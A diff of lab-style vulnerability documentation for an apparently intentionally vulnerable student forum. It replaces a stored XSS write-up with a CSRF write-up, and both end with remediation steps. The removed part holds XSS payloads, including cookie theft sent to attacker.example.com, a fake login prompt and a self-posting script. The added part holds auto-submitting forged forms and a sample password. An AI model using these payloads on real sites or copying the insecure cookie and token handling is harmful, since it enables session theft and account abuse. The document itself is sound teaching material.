@@ -1,103 +1,108 @@
-# Stored Cross Site Scripting Vulnerability Documentation:
+# Cross Site Request Forgery Vulnerability Documentation:
 
 ## 1. Vulnerability Overview:
-1. Problem Definition: Stored Cross Site Scripting occurs when an application receives untrusted data, saves it into a persistent storage system such as SQLite, and subsequently renders that data in the browser without contextual sanitization.
-2. Persistent Execution: Because the malicious payload is saved permanently in the database, every user who visits that discussion thread automatically triggers the execution.
-3. Severe Impact: Attackers can execute arbitrary JavaScript commands within the victim browser session to steal cookies, perform unauthorized actions, or display fraudulent login forms.
+1. Problem Definition: Cross Site Request Forgery exploits the fundamental browser mechanism where authenticated session cookies are automatically attached to outgoing HTTP requests regardless of origin.
+2. Ambient Credential Exploitation: When an authenticated user visits an external malicious web page, that page can silently trigger unauthorized state changing actions against the target application.
+3. High Threat Impact: Attackers can forge requests to modify user profile details, alter account credentials, publish unauthorized discussions, or perform administrative actions on behalf of the victim.
 
-## 2. Root Cause Code Analysis:
+## 2. Root Cause Code Analysis in Version 1:
 
-### 2.1 Backend Data Ingestion in `server/routes/posts.js`:
-1. The server receives user input from the request body without sanitizing HTML tags or stripping executable scripts.
-2. The raw string is inserted directly into the SQLite database table `comments`:
+### 2.1 Missing Anti CSRF Synchronizer Tokens:
+1. In file `server/routes/auth.js`, the profile update endpoint processes incoming POST and PUT requests relying solely on the presence of `session_token`.
+2. Code Snippet.
 ```javascript
-db.prepare(`
-  INSERT INTO comments (post_id, user_id, content)
-  VALUES (?, ?, ?)
-`).run(req.params.id, req.user.id, content);
+const handleProfileUpdate = (req, res) => {
+  if (!req.user) {
+    return res.status(401).json({ error: 'Authentication required.' });
+  }
+  const { full_name, bio } = req.body;
+  const db = getDB();
+  db.prepare('UPDATE users SET full_name = ?, bio = ? WHERE id = ?').run(
+    full_name || req.user.full_name,
+    bio !== undefined ? bio : req.user.bio,
+    req.user.id
+  );
+  return res.json({ message: 'Profile updated successfully' });
+};
+router.post('/profile', authenticate, handleProfileUpdate);
 ```
-3. SQL parameterization prevents SQL injection, but does not prevent Cross Site Scripting because the database legitimately stores the raw string.
+3. Vulnerability Flaw: The server performs zero token comparison, meaning any valid cookie holder can be coerced into submitting state changes.
 
-### 2.2 Frontend DOM Rendering in `client/src/components/ContentRenderer.jsx`:
-1. The React frontend retrieves the stored comment string from the server.
-2. The component inserts the string into the DOM using `innerHTML` to enable rich text styling:
-```javascript
-containerRef.current.innerHTML = content;
-```
-3. Script tags and inline HTML event handlers such as `onerror` and `onload` are parsed and executed by the browser engine.
-
-### 2.3 Session Cookie Configuration in `server/routes/auth.js`:
-1. The authentication module sets the session cookie without the `httpOnly` flag:
+### 2.2 Unrestricted Cookie SameSite Configuration:
+1. In file `server/routes/auth.js`, session cookies are issued without `SameSite=Strict` enforcement.
+2. Code Snippet.
 ```javascript
 res.cookie('session_token', token, {
   path: '/'
 });
 ```
-2. Because `httpOnly` is absent, client scripts can read authentication tokens through `document.cookie`.
+3. Vulnerability Flaw: The browser automatically includes the `session_token` cookie when submitting cross origin HTML forms targeting `http://localhost:3000`.
 
-## 3. Attack Demonstration Procedure:
+### 2.3 Absent Origin and Referer Header Validation:
+1. In file `server/server.js`, the server accepts incoming requests without verifying whether the request was initiated from the trusted application origin.
+2. Vulnerability Flaw: External web pages hosted on separate domains or local ports can freely dispatch requests to the forum backend without being blocked.
 
-### Step 1: Attacker Account Access:
-1. The attacker logs into the forum using the account credentials for `lucky` or registers a new account.
-2. The attacker navigates to the first discussion thread titled `Welcome to the IIITA Open Source Community Forum`.
+## 3. Step by Step Attack Demonstration Walkthrough:
 
-### Step 2: Injecting the Malicious Payload:
-1. In the Leave a Comment text area, the attacker inputs an HTML and JavaScript payload:
+### 3.1 Step 1: Legitimate User Authentication:
+1. An administrator or community contributor logs into the platform using username `mridankan` and password `mridankan123`.
+2. The browser receives the active session identifier and stores it in the cookie jar for `localhost:3000`.
+
+### 3.2 Step 2: Attacker Exploit Webpage Setup:
+1. The attacker creates an external deceptive webpage `attacker_csrf_exploit.html` containing an invisible HTML form with forged input fields.
 ```html
-<img src="invalid" onerror="alert('Stored XSS Triggered! Active Session Cookie: ' + document.cookie)">
-```
-2. The attacker clicks the Submit Comment button.
-3. The application sends a POST request to `/api/posts/1/comments` and stores the payload in the SQLite database.
-
-### Step 3: Victim Navigation and Payload Trigger:
-1. An administrator such as Mridankan Mandal logs in on another browser or window.
-2. The administrator navigates to the Discussions tab and opens the first post.
-3. The browser fetches the discussion comments and renders the attacker input directly into the DOM.
-4. The image element fails to load the source, triggering the `onerror` event handler automatically.
-5. The JavaScript executes immediately within the administrator session context, popping up an alert box displaying the administrator session token.
-
-## 4. Practical Exploit Examples and Explanations:
-
-### Example 1: Proof of Concept Alert Dialog:
-1. Payload:
-```html
-<img src="x" onerror="alert('Stored XSS Executed on IIITA Forum! User: ' + document.cookie)">
-```
-2. Explanation: This payload verifies that arbitrary JavaScript execution is possible upon rendering. The `img` element deliberately uses an invalid image path `x` to force the browser to trigger the `onerror` event handler without requiring user clicks.
-
-### Example 2: Session Cookie Exfiltration and Account Takeover:
-1. Payload:
-```html
-<img src="x" onerror="fetch('https://attacker.example.com/log?cookie=' + encodeURIComponent(document.cookie))">
-```
-2. Explanation: This payload silently reads the victim session cookie via `document.cookie` and transmits it through an HTTP GET request to an external server. Once the attacker obtains the token, they can impersonate the administrator without knowing the password.
-
-### Example 3: Injected Phishing Form and Credential Harvesting:
-1. Payload:
-```html
-<div style="border: 2px solid #dc2626; padding: 15px; background: #ffffff; border-radius: 6px; margin: 10px 0;">
-  <h4 style="color: #dc2626;">Session Expired</h4>
-  <p>Please reenter your campus password:</p>
-  <input type="password" id="phish_pass" placeholder="Password">
-  <button onclick="alert('Stolen: ' + document.getElementById('phish_pass').value)">Confirm</button>
-</div>
-```
-2. Explanation: This payload injects a fake authentication prompt directly into the legitimate forum discussion. Because the form appears within the trusted domain, users may enter sensitive credentials which are subsequently captured by the attacker.
-
-### Example 4: Stored XSS Worm and Automated Action Execution:
-1. Payload:
-```html
+<form id="exploit" action="http://localhost:3000/api/auth/profile" method="POST">
+  <input type="hidden" name="full_name" value="Mridankan Mandal (Hijacked via CSRF)" />
+  <input type="hidden" name="bio" value="Account profile compromised via Cross Site Request Forgery." />
+</form>
 <script>
-fetch('/api/posts/1/comments', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ content: 'This thread has been compromised by an automated script.' })
-});
+  window.onload = function() { document.getElementById('exploit').submit(); };
 </script>
 ```
-2. Explanation: This payload uses the viewing victim active authenticated session to make a background POST request to the API, automatically submitting unauthorized comments on behalf of the victim.
 
-## 5. Summary of Key Remediation Concepts for Version 2:
-1. Context Aware Output Neutralization: Use libraries such as `DOMPurify` or default React safe text interpolation to strip executable scripts and hazardous attributes before inserting content into the DOM.
-2. HttpOnly Cookie Flags: Ensure all authentication cookies are configured with `httpOnly: true` and `sameSite: 'strict'` so that client scripts cannot access session tokens.
-3. Content Security Policy: Enforce strict HTTP Content Security Policy response headers to restrict the browser from executing unauthorized inline scripts.
+### 3.3 Step 3: Victim Lured to Attacker Portal:
+1. The victim opens the attacker link while keeping their authenticated forum session active in the background.
+
+### 3.4 Step 4: Silent Request Transmission:
+1. The attacker webpage automatically triggers form submission to `http://localhost:3000/api/auth/profile`.
+2. The victim browser attaches the valid `session_token` cookie automatically.
+
+### 3.5 Step 5: Unauthorized State Modification:
+1. The backend server authenticates the request through the attached session cookie and updates the victim biography without user consent.
+
+## 4. Practical Exploit Examples and Attack Scenarios:
+
+### 4.1 Example 1: Unauthorized Profile and Biography Modification:
+1. Forged Payload.
+```html
+<form action="http://localhost:3000/api/auth/profile" method="POST">
+  <input type="hidden" name="full_name" value="Attacker Impersonator" />
+  <input type="hidden" name="bio" value="This account has been compromised by an external malicious script." />
+</form>
+```
+2. Explanation: Modifies the user public biography to advertise malicious content or ruin user reputation across the platform.
+
+### 4.2 Example 2: Unauthorized Discussion Creation:
+1. Forged Payload.
+```html
+<form action="http://localhost:3000/api/posts" method="POST">
+  <input type="hidden" name="title" value="Important Society Announcement" />
+  <input type="hidden" name="category" value="Announcements" />
+  <input type="hidden" name="content" value="Click here to claim fake campus gift cards: http://phishing.example.com" />
+</form>
+```
+2. Explanation: Abuses the victim administrative privileges to publish spam or phishing links directly into the announcements section.
+
+### 4.3 Example 3: Live Community Chat Spam Injection:
+1. Forged Payload.
+```html
+<form action="http://localhost:3000/api/chat" method="POST">
+  <input type="hidden" name="message" value="Automated spam transmitted through cross origin forged request." />
+</form>
+```
+2. Explanation: Injects unauthorized messages into the live community chat stream on behalf of the logged in user.
+
+## 5. Summary of Remediation Strategy for Version 2:
+1. Anti CSRF Synchronizer Tokens: Issue unique cryptographically secure tokens per session and require them in custom headers on all state changing requests.
+2. SameSite Strict Cookie Policy: Enforce `sameSite: 'strict'` on session cookies to block ambient cookie attachment on cross origin requests.
+3. Origin and Referer Whitelisting: Implement middleware to strictly validate incoming request origins before processing state changing operations.
